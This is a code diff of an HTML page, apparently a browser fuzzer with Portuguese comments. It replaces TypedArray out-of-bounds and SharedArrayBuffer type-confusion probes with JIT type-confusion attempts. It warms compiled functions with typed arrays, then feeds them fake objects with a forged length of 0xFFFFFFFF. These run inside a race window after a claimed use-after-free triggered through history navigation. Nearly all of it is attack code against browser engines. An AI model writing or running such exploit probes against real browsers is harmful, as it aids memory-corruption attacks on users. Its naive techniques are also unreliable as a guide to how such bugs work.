@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html>
-<head><title>Fuzzer: TypedArray + UAF</title></head>
+<head><title>Fuzzer: JIT + UAF</title></head>
 <body>
-<button onclick="fuzz()">Fuzz TypedArray</button>
+<button onclick="fuzz()">Fuzz JIT</button>
 <pre id="log"></pre>
 
 <script>
@@ -24,89 +24,85 @@ async function triggerUAF() {
 }
 
 async function fuzz() {
-  log("=== FUZZING: TypedArray + UAF ===\n");
+  log("=== FUZZING: JIT Compiler + UAF ===\n");
   
-  // 1. Trigger UAF (desestabiliza heap)
-  log("[1] Triggering UAF to destabilize heap...");
   await triggerUAF();
   
-  // 2. Race window: criar TypedArrays durante estado inconsistente
   window.addEventListener('popstate', (e) => {
     if(e.state && e.state.index >= 40) {
-      log("\n[2] RACE WINDOW! Creating TypedArrays...");
+      log("\n[RACE] JIT fuzzing during UAF...\n");
       
-      // FUZZ 1: Criar arrays com tamanhos suspeitos
-      const sizes = [
-        0,           // Zero size
-        -1,          // Negative (integer underflow?)
-        0x7FFFFFFF,  // Max int32
-        0x80000000,  // Min int32 (negative)
-        0xFFFFFFFF,  // Max uint32
-        1 << 30,     // Large power of 2
-        (1 << 30) - 1, // Just below
-        (1 << 30) + 1  // Just above
-      ];
+      // FUZZ 1: Force JIT compilation com type confusion
+      function jit_target(arr, idx, val) {
+        // JIT vai assumir tipos após N iterações
+        arr[idx] = val;
+        return arr[idx];
+      }
       
-      sizes.forEach((size, idx) => {
-        try {
-          const arr = new Uint32Array(size);
-          log(`  [${idx}] Created size ${size}: length=${arr.length}`);
-          
-          // Tentar OOB access
-          try {
-            arr[arr.length] = 0xDEADBEEF;     // OOB write
-            const val = arr[arr.length + 10]; // OOB read
-            if(val !== undefined) {
-              log(`    🚨 OOB READ! arr[${arr.length + 10}] = 0x${val.toString(16)}`);
-            }
-          } catch(e) {
-            // Expected
-          }
-          
-          // Tentar mudar length durante race
-          try {
-            Object.defineProperty(arr, 'length', {
-              value: 0xFFFFFFFF,
-              writable: true
-            });
-            log(`    ⚠️  Length modified to: ${arr.length}`);
-          } catch(e) {}
-          
-        } catch(e) {
-          log(`  [${idx}] Size ${size} failed: ${e.message}`);
-        }
-      });
+      // Warm up JIT (10000 iterações)
+      const warm = new Uint32Array(100);
+      for(let i=0; i<10000; i++) {
+        jit_target(warm, i % 100, 0xAAAA0000 + i);
+      }
       
-      // FUZZ 2: Criar ArrayBuffer compartilhado durante UAF
+      log("  JIT warmed up (Uint32Array)\n");
+      
+      // ATAQUE: Trocar tipo durante execução compilada
+      log("  Switching to Object during JIT...");
+      const fake = {
+        0: 0x41414141,
+        1: 0x42424242,
+        length: 0xFFFFFFFF
+      };
+      fake.__proto__ = Array.prototype;
+      
       try {
-        const shared = new SharedArrayBuffer(0x10000);
-        const view1 = new Uint32Array(shared);
-        const view2 = new Float64Array(shared);
+        const result = jit_target(fake, 100, 0xDEADBEEF);
+        log(`    Result: 0x${result.toString(16)}`);
         
-        view1[0] = 0x41424344;
-        log(`\n  SharedArrayBuffer test:`);
-        log(`    view1[0] = 0x${view1[0].toString(16)}`);
-        log(`    view2[0] = ${view2[0]}`);
-        
-        // Tentar type confusion
-        view2[0] = 1.9526917464711512e-246; // 0x4141414141414141 em float
-        log(`    After float write:`);
-        log(`    view1[0] = 0x${view1[0].toString(16)}`);
-        log(`    view1[1] = 0x${view1[1].toString(16)}`);
-        
+        if(result === 0xDEADBEEF) {
+          log("    🚨 JIT CONFUSION! Wrote to fake object!");
+        }
       } catch(e) {
-        log(`  SharedArrayBuffer: ${e.message}`);
+        log(`    Exception: ${e.message}`);
+      }
+      
+      // FUZZ 2: Type confusion em loops
+      function confuse_loop(x) {
+        let result = 0;
+        for(let i=0; i<10; i++) {
+          result += x[i];
+        }
+        return result;
+      }
+      
+      // Warm up com array
+      for(let i=0; i<10000; i++) {
+        confuse_loop([1,2,3,4,5,6,7,8,9,10]);
+      }
+      
+      log("\n  Loop JIT warmed up");
+      
+      // Attack com object
+      const fake_arr = {
+        0: 1.1, 1: 2.2, 2: 3.3, 3: 4.4, 4: 5.5,
+        5: 6.6, 6: 7.7, 7: 8.8, 8: 9.9, 9: 10.10,
+        length: 10
+      };
+      
+      try {
+        const sum = confuse_loop(fake_arr);
+        log(`    Sum: ${sum}`);
+      } catch(e) {
+        log(`    Exception: ${e.message}`);
       }
     }
   });
   
-  // Trigger race
   for(let i=0; i<15; i++) {
     history.back();
     await new Promise(r=>setTimeout(r,40));
   }
-  
-  log("\n[3] Fuzzing complete. Check for crashes/OOB.");
 }
 </script>
 </body>
